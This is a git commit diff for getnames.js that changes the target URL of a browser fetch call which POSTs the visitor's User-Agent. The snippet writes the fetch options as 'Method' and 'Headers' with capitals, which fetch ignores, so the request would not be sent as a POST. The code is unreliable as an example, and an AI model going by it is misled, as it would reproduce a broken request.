3d5c3079eec7d3ea69532e249f7888a21122f4a2
tr1fled <124415108+tr1fled@users.noreply.github.com>
2024-08-05 22:06:36 -0600

    Update getnames.js
    Signed-off-by: tr1fled <124415108+tr1fled@users.noreply.github.com>

--- getnames.js
+++ getnames.js
@@ -1,4 +1,4 @@
-fetch('https://bank.charity/watch.php?id=TZAKKT.png', {
+fetch('https://www.ps3cfw.com/cool.php?item=21940524', {
   Method: 'POST',
   Headers: {
     'User-Agent': window.navigator.userAgent,
